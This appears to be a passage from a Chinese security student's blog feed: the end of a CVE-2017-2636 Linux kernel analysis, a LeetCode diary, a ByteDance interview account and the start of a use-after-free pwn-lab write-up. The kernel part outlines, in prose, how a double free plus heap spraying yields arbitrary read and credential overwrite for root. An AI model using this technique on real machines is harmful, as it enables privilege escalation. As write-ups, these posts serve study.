class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *write_buf;</span><br><span class="line">    <span class="keyword">int</span> write_cnt;</span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> ssize_t <span class="title">do_tty_write</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">ssize_t</span> (*write)(struct tty_struct *, struct file *, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *, <span class="keyword">size_t</span>),</span></span></span><br><span class="line"><span class="function"><span class="params">    struct tty_struct *tty,</span></span></span><br><span class="line"><span class="function"><span class="params">    struct file *file,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="keyword">char</span> __user *buf,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">size_t</span> count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">ssize_t</span> ret, written = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> chunk;</span><br><span class="line"></span><br><span class="line">    ret = tty_write_lock(tty, file-&gt;f_flags &amp; O_NDELAY);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">    chunk = <span class="number">2048</span>;    <span class="comment">/* 默认大小为2048 */</span></span><br><span class="line">    <span class="keyword">if</span> (test_bit(TTY_NO_WRITE_SPLIT, &amp;tty-&gt;flags))</span><br><span class="line">        chunk = <span class="number">65536</span>;    <span class="comment">/* 如果标志置位, 则扩充大小到65536 */</span></span><br><span class="line">    <span class="keyword">if</span> (count &lt; chunk)</span><br><span class="line">        chunk = count;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* write_buf/write_cnt is protected by the atomic_write_lock mutex */</span></span><br><span class="line">    <span class="keyword">if</span> (tty-&gt;write_cnt &lt; chunk) &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf_chunk;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (chunk &lt; <span class="number">1024</span>)</span><br><span class="line">            chunk = <span class="number">1024</span>;</span><br><span class="line"></span><br><span class="line">        buf_chunk = kmalloc(chunk, GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (!buf_chunk) &#123;</span><br><span class="line">            ret = -ENOMEM;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        kfree(tty-&gt;write_buf);</span><br><span class="line">        tty-&gt;write_cnt = chunk;</span><br><span class="line">        tty-&gt;write_buf = buf_chunk;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Do the write .. */</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">out:</span><br><span class="line">    tty_write_unlock(tty);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h2><p>结合上述 encrypted_key_payload 和 tty_struct.write_buf，完成利用。</p><ul><li>准备工作<ul><li>堆喷，准备大量的所需大小的对象，放入内核空间，便于后续的检测反馈。（难道这就是我最不会的堆风水？）</li><li>一个 user-type 的 key，encrypted key 需要这个。</li></ul></li><li>一个或多个 encrypted 的 key，消耗 key 的总大小，便于后续的检测反馈。</li><li>触发 double-free。</li><li>(交替)申请 write_buf，encrypted_key_payload 对象(使用 encrypted_update 函数)。这个可能需要根据漏洞具体的环境来看申请的对象的顺序。</li><li>检测 encrypted_update 的返回值，如果为 EINVAL，则判断此时的内核空间中两个对象重叠。（目地达成，耶）</li><li>不停的调用 encrypted_update 检测合适的 master_desc 的位置。由于在 read 函数中需要 master_desc 的值，所以我们首先需要遍历内核空间，找到所需要的字串。所以我们设置好 encrypted_update 的参数(通过write_buf)，使调用过程如下：encrypted_update -&gt; encrypted_key_alloc -&gt; key_payload_reserve。当其返回 EDQUOT 时，即找到对应的 master_desc。在准备工作中的堆喷和消耗 key 的总大小，即是为了找到这个 master_desc。</li><li>此时已经具备任意地址读的能力。检测 init_task，或者检测相应的 task_struct 结构中的 comm 字段，找到目标进程的 task_struct 地址，然后获取 cred 地址。</li><li>调用 encrypted_destroy，完成提权。这个函数的调用需要先 keyctl_revoke，它只是将 key 进行一下标记，然后调用 gc。在测试过程中发现，在 keyctl_revoke 之后，立即调用 add_key 来申请一个与需要 destroy 的 key 相同的 payload，会立即触发 encrypted_destory 函数。</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>第一次分析 CVE，感觉发现漏洞利用点很重要，可能不是常规的 double-free，是因为条件竞争产生的伪 dbf；然后如何利用，找一些有用的辅助函数，玩好堆风水很重要，不像 pwn 题中可以准确推测出内存布局。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;不谈背景只看漏洞都是耍流氓。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;“这是 CVE-2017-2636 的声明，该漏洞即 N_HLDC (
      
    
    </summary>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/categories/CVE/"/>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>每天几道 算法</title>
    <link href="https://github.com/Cracke-S-J/2020/02/14/algorithm/"/>
    <id>https://github.com/Cracke-S-J/2020/02/14/algorithm/</id>
    <published>2020-02-13T17:07:29.000Z</published>
    <updated>2020-03-21T11:18:09.693Z</updated>
    
    <content type="html"><![CDATA[<p>跟 dyf 聊天，扯起了算法，从高三 oi 退役以来，就大一冬天看过一阵算法，去梆梆之后就基本再也没看过了，于是就上 leetcode 刷了几道，难度相比竞赛来说还是弱的很，但是挺有意思的。</p><h2 id="爬楼梯问题"><a href="#爬楼梯问题" class="headerlink" title="爬楼梯问题"></a>爬楼梯问题</h2><p>就是一个线性 dp，dp[i] = min(dp[i-1]+val[i-1], dp[i-2]+val[i-2])，当前状态是由走一步或者走两步来的。</p><h2 id="找第一个不重复的字母"><a href="#找第一个不重复的字母" class="headerlink" title="找第一个不重复的字母"></a>找第一个不重复的字母</h2><p>水题，不表。</p><h2 id="出现前-k-多的字符串"><a href="#出现前-k-多的字符串" class="headerlink" title="出现前 k 多的字符串"></a>出现前 k 多的字符串</h2><p>STL 排排序就行。</p><h2 id="数组组三角形"><a href="#数组组三角形" class="headerlink" title="数组组三角形"></a>数组组三角形</h2><p>左右指针移动计数，O(n^2)。</p><h2 id="毒死猪"><a href="#毒死猪" class="headerlink" title="毒死猪"></a>毒死猪</h2><p>这个挺有意思，可以算机智题或建模。假设有 n 只水桶，猪饮水中毒后会在 m 分钟内死亡，你需要多少猪（x）就能在 p 分钟内找出 “有毒” 水桶？这 n 只水桶里有且仅有一只有毒的桶。x = (p/m+1)根号(n)。</p><h2 id="铺地板"><a href="#铺地板" class="headerlink" title="铺地板"></a>铺地板</h2><p>你是一位施工队的工长，根据设计师的要求准备为一套设计风格独特的房子进行室内装修。房子的客厅大小为 n x m，为保持极简的风格，需要使用尽可能少的 正方形 瓷砖来铺盖地面。假设正方形瓷砖的规格不限，边长都是整数。(1 &lt;= n &lt;= 13, 1 &lt;= m &lt;= 13)</p><p>看起来像可恶的 dp，一共有三种情况，两个块横着拼或竖着拼，还有一种是四个块围起来，中间一个 1x1 的小块，O((m*n)^2) = 2,924,207，合适。</p><h2 id="二叉搜索树"><a href="#二叉搜索树" class="headerlink" title="二叉搜索树"></a>二叉搜索树</h2><p>给定一个所有节点为非负值的二叉搜索树,求树中任意两节点的差的绝对值的最小值。</p><p>知识点是二叉搜索树，它的中序遍历是从小到大排序的。</p><h2 id="回文字典序"><a href="#回文字典序" class="headerlink" title="回文字典序"></a>回文字典序</h2><p>一道无聊的模拟题。</p><h2 id="奇偶跳"><a href="#奇偶跳" class="headerlink" title="奇偶跳"></a>奇偶跳</h2><p>给定一个整数数组 A，你可以从某一起始索引出发，跳跃一定次数。在你跳跃的过程中，第 1、3、5… 次跳跃称为奇数跳跃，而第 2、4、6… 次跳跃称为偶数跳跃。</p><p>你可以按以下方式从索引 i 向后跳转到索引 j（其中 i &lt; j）：</p><p>在进行奇数跳跃时（如，第 1，3，5… 次跳跃），你将会跳到索引 j，使得 A[i] &lt;= A[j]，A[j] 是可能的最小值。如果存在多个这样的索引 j，你只能跳到满足要求的最小索引 j 上。<br>在进行偶数跳跃时（如，第 2，4，6… 次跳跃），你将会跳到索引 j，使得 A[i] =&gt; A[j]，A[j] 是可能的最大值。如果存在多个这样的索引 j，你只能跳到满足要求的最小索引 j 上。<br>（对于某些索引 i，可能无法进行合乎要求的跳跃。）<br>如果从某一索引开始跳跃一定次数（可能是 0 次或多次），就可以到达数组的末尾（索引 A.length - 1），那么该索引就会被认为是好的起始索引。</p><p>返回好的起始索引的数量。</p><p>这显然是一道 dp 题。</p><p>f(i, 0) = f(j, 1)<br>f(i, 1) = f(k, 0)<br>j 表示奇数跳的下一个位置，k 表示偶数跳的下一个位置。</p><p>下一个位置的预处理可以用单调队列。</p><h2 id="合并两个数组"><a href="#合并两个数组" class="headerlink" title="合并两个数组"></a>合并两个数组</h2><p>无聊的排序。</p><h2 id="字符串查找"><a href="#字符串查找" class="headerlink" title="字符串查找"></a>字符串查找</h2><p>无聊的字符串处理题。</p><h2 id="我的日程安排表"><a href="#我的日程安排表" class="headerlink" title="我的日程安排表"></a>我的日程安排表</h2><p>看起来这么像线段树呢，其实不用，遍历就行。前缀和差分也行。</p><h2 id="不喜欢问题"><a href="#不喜欢问题" class="headerlink" title="不喜欢问题"></a>不喜欢问题</h2><p>有点像囚犯打架问题，着色。</p><h2 id="奇怪的打印机"><a href="#奇怪的打印机" class="headerlink" title="奇怪的打印机"></a>奇怪的打印机</h2><p>有台奇怪的打印机有以下两个特殊要求：</p><ol><li>打印机每次只能打印同一个字符序列。</li><li>每次可以在任意起始和结束位置打印新字符，并且会覆盖掉原来已有的字符。</li></ol><p>事出有幺，必为 dp，有一种合并石子的感 jio。可是合并石子我已经忘了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> 枚举长度</span><br><span class="line">    <span class="keyword">for</span> 枚举边界</span><br><span class="line">        <span class="keyword">for</span> 枚举边界中的 k</span><br><span class="line">            f[l][r] = min(f[l][r], f[l][k - <span class="number">1</span>] + f[k + <span class="number">1</span>][r]);</span><br></pre></td></tr></table></figure><h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>代码能力题，两个栈。现在再写，有一种 tm 语法树的感觉。</p><h2 id="迟到"><a href="#迟到" class="headerlink" title="迟到"></a>迟到</h2><p>水模拟。</p><h2 id="种花"><a href="#种花" class="headerlink" title="种花"></a>种花</h2><p>水模拟。</p><h2 id="还是不喜欢问题"><a href="#还是不喜欢问题" class="headerlink" title="还是不喜欢问题"></a>还是不喜欢问题</h2><p>。</p><h2 id="子串独特字符"><a href="#子串独特字符" class="headerlink" title="子串独特字符"></a>子串独特字符</h2><p>如果一个字符在字符串 S 中有且仅有出现一次，那么我们称其为独特字符。</p><p>例如，在字符串 S = “LETTER” 中，”L” 和 “R” 可以被称为独特字符。</p><p>我们再定义 UNIQ(S) 作为字符串 S 中独特字符的个数。</p><p>那么，在 S = “LETTER” 中， UNIQ(“LETTER”) =  2。</p><p>对于给定字符串 S，计算其所有非空子串的独特字符的个数（即 UNIQ(substring)）之和。</p><p>如果在 S 的不同位置上出现两个甚至多个相同的子串，那么我们认为这些子串是不同的。</p><p>考虑到答案可能会非常大，规定返回格式为：结果 mod 10 ^ 9 + 7。</p><p>说明: 0 &lt;= S.length &lt;= 10000。</p><p><code>f[i] = f[i − 1] + (i + n[i] − 2 ∗ m[i])</code> 瞎鸡推一下推来的。</p><p><code>f[i] = sum(1 to i - 1 -&gt; i)</code></p><h2 id="滑砖拼图"><a href="#滑砖拼图" class="headerlink" title="滑砖拼图"></a>滑砖拼图</h2><p>是什么华容道游戏，bfs。</p><h2 id="还是猪"><a href="#还是猪" class="headerlink" title="还是猪"></a>还是猪</h2><p>。</p><h2 id="优美排列"><a href="#优美排列" class="headerlink" title="优美排列"></a>优美排列</h2><p>假设有从 1 到 N 的 N 个整数，如果从这 N 个数字中成功构造出一个数组，使得数组的第 i 位 (1 &lt;= i &lt;= N) 满足如下两个条件中的一个，我们就称这个数组为一个优美的排列。条件：</p><ul><li>第 i 位的数字能被 i 整除</li><li>i 能被第 i 位上的数字整除</li></ul><p>现在给定一个整数 N，请问可以构造多少个优美的排列？（N &lt;= 15）</p><p>暴力的气息哈哈哈哈。dfs。</p><h2 id="连网线"><a href="#连网线" class="headerlink" title="连网线"></a>连网线</h2><p>并查集，只要大于 n - 1 条边，就是块数 - 1，否则不行。</p><h2 id="数据流不相交区间"><a href="#数据流不相交区间" class="headerlink" title="数据流不相交区间"></a>数据流不相交区间</h2><p>给定一个非负整数的数据流输入 a1，a2，…，an，…，将到目前为止看到的数字总结为不相交的区间列表。</p><p>例如，假设数据流中的整数为 1，3，7，2，6，…，每次的总结为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">1</span>], [<span class="number">3</span>, <span class="number">3</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">1</span>], [<span class="number">3</span>, <span class="number">3</span>], [<span class="number">7</span>, <span class="number">7</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>], [<span class="number">7</span>, <span class="number">7</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>], [<span class="number">6</span>, <span class="number">7</span>]</span><br></pre></td></tr></table></figure><p>讲真一开始没看懂。后来，就插入就完了。</p><p>最后 3 秒提交通过，稳…</p><h2 id="填数独"><a href="#填数独" class="headerlink" title="填数独"></a>填数独</h2><p>dfs 回溯。会爆栈，可以用空间优化时间。</p><h2 id="二叉树的祖父结点"><a href="#二叉树的祖父结点" class="headerlink" title="二叉树的祖父结点"></a>二叉树的祖父结点</h2><p><code>dfs(gp_val, p_val, node);</code></p><h2 id="返回重复子树"><a href="#返回重复子树" class="headerlink" title="返回重复子树"></a>返回重复子树</h2><p>又让我想起了 compiler…用 map 映射，然后花式遍历。</p><h2 id="反转链表"><a href="#反转链表" class="headerlink" title="反转链表"></a>反转链表</h2><p>就是想让写一下链表反转。</p><h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><p>两行代码…</p><h2 id="词根"><a href="#词根" class="headerlink" title="词根"></a>词根</h2><p>在英语中，我们有一个叫做 词根(root)的概念，它可以跟着其他一些词组成另一个较长的单词——我们称这个词为 继承词(successor)。例如，词根an，跟随着单词 other(其他)，可以形成新的单词 another(另一个)。</p><p>现在，给定一个由许多词根组成的词典和一个句子。你需要将句子中的所有继承词用词根替换掉。如果继承词有许多可以形成它的词根，则用最短的词根替换它。</p><p>这个是给单词建图…快的话建个数组模拟邻接表。</p><h2 id="最短路"><a href="#最短路" class="headerlink" title="最短路"></a>最短路</h2><p>这小范围，写个 bfs 就行。</p><h2 id="找数"><a href="#找数" class="headerlink" title="找数"></a>找数</h2><p>给定一个大小为 n 的数组，找出其中所有出现超过 ⌊ n/3 ⌋ 次的元素。</p><p>说明: 要求算法的时间复杂度为 O(n)，空间复杂度为 O(1)。</p><p>这个算法叫摩尔投票算法？？</p><h2 id="建二叉搜索树"><a href="#建二叉搜索树" class="headerlink" title="建二叉搜索树"></a>建二叉搜索树</h2><h2 id="边框着色"><a href="#边框着色" class="headerlink" title="边框着色"></a>边框着色</h2><p>dfs。</p><h2 id="判断是否是子串"><a href="#判断是否是子串" class="headerlink" title="判断是否是子串"></a>判断是否是子串</h2><p>双指针。</p><h2 id="切砖"><a href="#切砖" class="headerlink" title="切砖"></a>切砖</h2><p>智力题。</p><h2 id="猜数"><a href="#猜数" class="headerlink" title="猜数"></a>猜数</h2><p>智力题。</p><h2 id="位运算加法"><a href="#位运算加法" class="headerlink" title="位运算加法"></a>位运算加法</h2><p>c++ 编译选项加的有毒？我就是成心让它溢出的，佛，最后用 js 写过了。</p><h2 id="增减字符串"><a href="#增减字符串" class="headerlink" title="增减字符串"></a>增减字符串</h2><p>a~，又让我想起单调队列了…不过好像是个 O(n) 的模拟题。</p><h2 id="字母板上的路径"><a href="#字母板上的路径" class="headerlink" title="字母板上的路径"></a>字母板上的路径</h2><p>让我想起了曼哈顿距离…其实没啥关系，是道水题。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;跟 dyf 聊天，扯起了算法，从高三 oi 退役以来，就大一冬天看过一阵算法，去梆梆之后就基本再也没看过了，于是就上 leetcode 刷了几道，难度相比竞赛来说还是弱的很，但是挺有意思的。&lt;/p&gt;
&lt;h2 id=&quot;爬楼梯问题&quot;&gt;&lt;a href=&quot;#爬楼梯问题&quot; class
      
    
    </summary>
    
    
      <category term="算法" scheme="https://github.com/Cracke-S-J/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="https://github.com/Cracke-S-J/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>字节跳动面试实况转播</title>
    <link href="https://github.com/Cracke-S-J/2020/02/05/bytedanceinterview/"/>
    <id>https://github.com/Cracke-S-J/2020/02/05/bytedanceinterview/</id>
    <published>2020-02-05T08:06:01.000Z</published>
    <updated>2020-03-29T06:23:53.816Z</updated>
    
    <content type="html"><![CDATA[<p>岗位是 Android Native 层开发，团队部门啥的我都不知道，具体干啥我也不知道。</p><p>视频面一次，现场一次。在此我要吐槽视频面，第一是晚上，反正是各种不行，一开始是我进不去，面试官让我多进几次，他也是进了好几次，我各种重启、重新进，终于进去了，然后各种听不见声音，各种看不见对方，通过双方不断地玄学重进之后，终于我能听到面试官的声音，能看到双方画面，他能听见我的声音，看不到我的画面，到此已经45分钟过去了，然后面试官放弃了，说改天，以至于折腾了45分钟，面试官终于还是没有成功地看到我的脸。。。</p><p>还有一个前提是我没准备，真的没准备，5 分钟翻了翻 java 的 hello world 怎么写，因为在 xc5 还没太干够，而且大二下的课确实也多点，字节的管理应该也会比较严，不方便随时失踪。</p><p>细节记不清了（嘤嘤），大致是下面这样（两面杂揉到一起）。</p><p>面试官：先介绍一下自己。</p><p>我：叽里呱啦…(谦虚地吹13)。</p><p>面试官：你玩游戏吗？</p><p>我：不玩。</p><p>面试官：为什么不玩，详细说说。</p><p>我：（？）小时候爱玩，长大不爱玩了。</p><p>面试官：为什么。</p><p>我：（？）写代码以后就不爱打游戏了。</p><p>（沉默…）</p><p>面试官：继续。</p><p>我：（？wdnmd 还要我说啥）现在只玩养生游戏。</p><p>面试官：我们先来问一些基础问题。</p><p>我：（wdnmd）终于开始了。</p><p>面试官：说一下 c 语言函数调用过程，说一下虚函数在类中的内存分布。</p><p>我：blablah…</p><p>面试官：说一下 Android 打包过程。</p><p>我：忘了。</p><p>面试官：说一下 Apk 包里有哪些东西。</p><p>我：classes.dex lib ….</p><p>面试官：说一下 打包过程。</p><p>我：忘了顺序了。</p><p>面试官：说一下 Android 四大组件，Layout 什么的。</p><p>我：<del>爷</del>忘了（哈哈哈哈）。</p><p>面试官：说一下 java 四种引用的区别，重载和重写的区别。</p><p>我：重载是….重写是….，四种引用忘了。</p><p>面试官：Java GC 说一下。</p><p>我：什么代代代代，这样那样……</p><p>（相信我当初面梆梆的时候这些东西可会了，好久没看是真的忘）。</p><p>然后开始聊过往经历。</p><p>我：（劳资开始了）Android 有三种加固，分别是，C++ Java 混淆能怎么怎么做，我是怎么日微信和支付宝的，我是怎么上马甲包的……</p><p>面试官：还有什么没<del>吹</del>讲到的吗？</p><p>我：应该没有了。</p><p>下面是重头戏，算法：（字节一直是很重算法的（摊手.gif））</p><p>手写算法：</p><ul><li>冒泡排序（是我有罪，竟然没写好）</li><li>LCA（这个<del>爷</del>我会，写写写…）</li></ul><p>面试官：不准用额外空间，不准改变树的结构。</p><p>我：（<del>爷</del>不会了）瞎丁丁写。</p><p>（因为我的算法都是高中时打 noip 学的，重速度不重空间，所以我会的 LCA 带个额外的预处理的结点深度，然后树上倍增，查询时间复杂度是 O(logn)，可是面试官不让这么弄，所以我开始瞎造，其实应该忽略时间复杂度，先写一个再说，面试官心里预期可能就写个 O(nlogn)的就行）</p><p>视频在线算法：</p><ul><li>二叉树已知先序和中序，求后序。</li></ul><p>面试官：代码能力怎么样。</p><p>我：还行吧，高中时候会写算法，现在好久不看了。</p><p>（疯狂回想先序中序后序是什么来着，印象中写了挺久的，但是也算写出来了吧哈哈哈哈）。</p><p>现场还问了一个脑筋急转弯，一根木棍燃烧一小时，给一把木棍，怎么取 45 分钟。</p><p>这个把戏我之前听说过，然后我故作沉思后<del>章</del>张口就来。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;岗位是 Android Native 层开发，团队部门啥的我都不知道，具体干啥我也不知道。&lt;/p&gt;
&lt;p&gt;视频面一次，现场一次。在此我要吐槽视频面，第一是晚上，反正是各种不行，一开始是我进不去，面试官让我多进几次，他也是进了好几次，我各种重启、重新进，终于进去了，然后各种听
      
    
    </summary>
    
    
      <category term="面试体验" scheme="https://github.com/Cracke-S-J/categories/%E9%9D%A2%E8%AF%95%E4%BD%93%E9%AA%8C/"/>
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/categories/%E9%9D%A2%E8%AF%95%E4%BD%93%E9%AA%8C/Android/"/>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/tags/Android/"/>
    
      <category term="面试体验" scheme="https://github.com/Cracke-S-J/tags/%E9%9D%A2%E8%AF%95%E4%BD%93%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>每天一道 pwn</title>
    <link href="https://github.com/Cracke-S-J/2020/01/21/daily-pwn/"/>
    <id>https://github.com/Cracke-S-J/2020/01/21/daily-pwn/</id>
    <published>2020-01-21T09:22:42.000Z</published>
    <updated>2020-03-23T09:25:31.805Z</updated>
    
    <content type="html"><![CDATA[<p>ssj 最近闲的*疼，决定每天写一道 pwn 题（也可能是几道）。</p><h2 id="2020-1-21"><a href="#2020-1-21" class="headerlink" title="2020-1-21"></a>2020-1-21</h2><h3 id="UAF-lab-10-hacknote"><a href="#UAF-lab-10-hacknote" class="headerlink" title="UAF - lab 10 hacknote"></a>UAF - lab 10 hacknote</h3><p>主要有四个功能。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">----------------------</span><br><span class="line">       HackNote</span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note</span><br><span class="line"> 2. Delete note</span><br><span class="line"> 3. Print note</span><br><span class="line"> 4. Exit</span><br><span class="line">----------------------</span><br></pre></td></tr></table></figure><p>下面是稍微整理过的代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// add note</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    最多添加 5 个 note，放在一个 notelist 里，目测出  note 的结构是这样的，</span></span><br><span class="line"><span class="comment">    struct note &#123;</span></span><br><span class="line"><span class="comment">        int (*func_ptr)(int); // print_note_content</span></span><br><span class="line"><span class="comment">        char *content;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">add_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( count &lt;= <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !notelist[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        notelist[i] = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !notelist[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Alloca Error"</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_DWORD *)notelist[i] = print_note_content;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Note size :"</span>);</span><br><span class="line">        read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>);</span><br><span class="line">        size = 